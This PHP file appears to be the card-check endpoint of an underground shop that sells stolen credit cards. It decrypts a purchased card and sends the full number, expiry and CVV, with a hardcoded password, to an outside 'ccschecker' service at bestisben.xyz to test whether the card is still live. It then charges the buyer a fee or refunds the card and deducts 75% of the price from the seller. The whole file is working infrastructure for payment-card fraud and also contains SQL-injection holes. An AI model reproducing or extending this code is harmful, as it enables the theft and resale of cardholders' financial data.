<?php
set_time_limit(0);
session_start();

//require "./includes/config.inc.php";
//include_once './21232f297a57a5a743894a0e4a801fc3/header.php';

if (checkLogin(PER_USER)) {
    if ($_GET["card_id"] != "") {
        $card_id = $db->escape($_GET["card_id"]);
        $sql = "SELECT *, AES_DECRYPT(card_number, '" . strval(DB_ENCRYPT_PASS) . "') AS card_number FROM `" . TABLE_CARDS . "` WHERE card_id = '" . $card_id . "' AND card_check = '" . strval(CHECK_DEFAULT) . "'";
        $records = $db->fetch_all_array($sql);
        if (count($records) > 0) {
            $value = $records[0];
            if($value["card_refund"] == '1'){
            if ($value["card_userid"] == $_SESSION["user_id"]) {
                if (intval($value["card_buyTime"]) + intval($db_config["check_timeout"]) >= time()) {
                    $sql = "SELECT * FROM `".TABLE_USERS."` WHERE user_id = '".$_SESSION["user_id"]."'";
	                $user_info = $db->query_first($sql);
                    $user_balance = $user_info["user_balance"];

                    if (true) {
                        if (doubleval($user_balance) >= doubleval($db_config["check_fee"])) {
                            $check_add["check_userid"] = $_SESSION["user_id"];
                            $check_add["check_cardid"] = $card_id;
                            $check_add["check_time"] = time();
                            $check = check_for_image($value["card_number"], $value["card_month"], $value["card_year"], $value["card_cvv"]);
                            if ($check == 1) {
                                $credit_update["user_balance"] = doubleval($user_balance) - doubleval($db_config["check_fee"]);
                                $check_add["check_fee"] = $db_config["check_fee"];
                                $check_add["check_result"] = strval(CHECK_VALID);
                                $check_update["card_check"] = strval(CHECK_VALID);
                                $respond = "<span class=\"green bold\">VALID</span>";
                            } elseif ($check == 2) {
                                $credit_update["user_balance"] = doubleval($user_balance) + doubleval($value["card_price"]);
                                $check_add["check_fee"] = $db_config["check_fee"];
                                $check_add["check_result"] = strval(CHECK_REFUND);
                                $check_update["card_check"] = strval(CHECK_REFUND);
                                $respond = "<span class=\"pink bold\">INVALID - REFUNDED</span>";
                                
                            $temp_card = mysqli_query($conn, "SELECT * FROM `cards` WHERE `card_id`='$card_id';");
                            $row = mysqli_fetch_array($temp_card);
                            $seller = $row['seller'];
                            $price = round(floatval(($row['card_price'] * 75) / 100),2);
                            
            				$sql = "UPDATE `users` SET seller_balance = seller_balance - '$price' WHERE `user_id`='$seller';";
            		        $result = mysqli_query($conn, $sql);
                            } else {
                                $check_add["check_result"] = strval(CHECK_UNKNOWN);
                                $respond = "<span class=\"blue bold\">UNKNOWN</span>";
                            }
                        } else {
                            $respond = "<span class=\"red bold\">You must have $" . number_format($db_config["check_fee"], 2, '.', '') . " to check card</span>";
                        }
                    } else {
                        $credit_update["user_balance"] = doubleval($user_balance) + doubleval($value["card_price"]);
                        $check_add["check_fee"] = $db_config["check_fee"];
                        $check_add["check_result"] = strval(CHECK_REFUND);
                        $check_update["card_check"] = strval(CHECK_REFUND);
                        $respond = "<span class=\"pink bold\">INVALID - REFUNDED</span>";
                        
                    	$temp_card = mysqli_query($conn, "SELECT * FROM `cards` WHERE `card_id`='$card_id';");
                        $row = mysqli_fetch_array($temp_card);
                        $seller = $row['seller'];
                        $price = round(floatval(($row['card_price'] * 75) / 100),2);
                        
        				$sql = "UPDATE `users` SET user_balance= user_balance - '$price' WHERE `user_id`='$seller';";
        		        $result = mysqli_query($conn, $sql);
                    }
                } else {
                    $check_add["check_result"] = strval(CHECK_INVALID);
                    $check_update["card_check"] = strval(CHECK_INVALID);
                    $respond = "<span class=\"red bold\">TIMEOUT</span>";
                }
            } else {
                $respond = "<span class=\"red bold\">This card doesn't belong to you</span>";
            }
            if (count($check_update) > 0) {
                if (!$db->query_update(TABLE_CARDS, $check_update, "card_id='" . $card_id . "'")) {
                    $respond = "<span class=\"red bold\">Update card check error, please try again</span>";
                }
            }
            if (count($check_add) > 0) {
                if (!$db->query_insert(TABLE_CHECKS, $check_add)) {
                    $respond = "<span class=\"red bold\">Insert check information error, please try again</span>";
                }
            }
            if (count($credit_update) > 0) {
                if ($db->query_update(TABLE_USERS, $credit_update, "user_id='" . $_SESSION["user_id"] . "'")) {
                    $user_info["user_balance"] = $credit_update["user_balance"];
                } else {
                    $respond = "<span class=\"red bold\">Update credit error, please try again</span>";
                }
            }
            
                }else {
    				$check_add["check_fee"] = $db_config["check_fee"];
					$check_add["check_result"] = strval(CHECK_VALID);
					$check_update["card_check"] = strval(CHECK_VALID);
					$respond = "<span class=\"green bold\">UNREFUNDABLE</span>";
        		}
        } else {
            $respond = "<span class=\"red bold\">This card doesn't exist</span>";
        }
        echo $respond;
    }
} else {
    header("Location: login.php");
}

function check_for_image($card_number, $card_month, $card_year, $card_cvv) {
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://bestisben.xyz/place/api/request/image',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);
    curl_close($curl);

    return get_cc_data($response, $card_number, $card_month, $card_year, $card_cvv);
}

function get_cc_data($response, $card_number, $card_month, $card_year, $card_cvv) {
    $curl = curl_init();
    //$response = (json_decode($response))->id;
    $response = json_decode($response);
    $response = $response->id;

    $card = $card_number . '/' . $card_month . '/' . $card_year . '/' . $card_cvv;
    $det_arr = [
        'canyouseeme' => $response,
        'password' => 'Tweeters05', // Type your password in here.
        'verification' => '4552',
        'text' => $card,
        'submit' => 'Submit',
    ];

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://bestisben.xyz/place/ccschecker6',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => http_build_query($det_arr),
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/x-www-form-urlencoded',
        ),
        CURLOPT_HEADER => 1,

    ));

    $response = curl_exec($curl);

    curl_close($curl);

    // Get the location field
    $response = explode(':', $response);

    $complete_response = trim(str_replace('CF-Cache-Status', '', $response[7]));

    if (strpos($complete_response, 'Expect-CT')) {
        return 2;
    }

    return check_response_page($complete_response);
}

function check_response_page($complete_response) {
    $data = file_get_contents('https://bestisben.xyz' . $complete_response . '?view=plain');

    $jsondata = json_decode($data);
    $jsondata = empty($jsondata->cc);

    // Loop until the location returns a response
    while ($jsondata) {
        // If the page is empty, wait for 10 seconds and reload the page.
        sleep(10);
        return check_response_page($complete_response);
    }

    $result = json_decode($data);

    if (!empty($result)) {
        $result = !empty($result->cc[0]) ? $result->cc[0] : [];

        if (!empty($result)) {
            if (!empty($result->PAID)) {
                return 1;
            } else {
                return 2;
            }
        } else {
            return 2;
        }
    } else {
        return 2;
    }

    return $result;
}

exit(0);
